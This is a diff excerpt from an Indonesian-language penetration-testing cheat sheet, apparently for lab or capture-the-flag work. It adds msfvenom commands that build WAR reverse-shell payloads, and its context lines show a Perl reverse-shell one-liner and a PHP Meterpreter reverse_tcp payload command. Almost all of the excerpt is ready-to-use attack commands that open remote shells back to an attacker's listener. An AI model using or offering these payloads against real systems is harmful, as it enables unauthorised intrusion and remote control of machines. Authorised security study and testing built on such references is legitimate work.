@@ -765,6 +765,10 @@ perl -e 'use Socket;$i="IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(
 **Untuk apa:** generate file payload (reverse shell/meterpreter) dalam berbagai format & platform.
 
 ```bash
+# WAR
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o shell.war
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.103 LPORT=4444 -f war -o shell.war
+
 # PHP Meterpreter (untuk target PHP/web — LFI/upload)
 msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.php
 sed -i '1s;^;<?php ;' shell.php     # pastikan ada tag <?php di awal
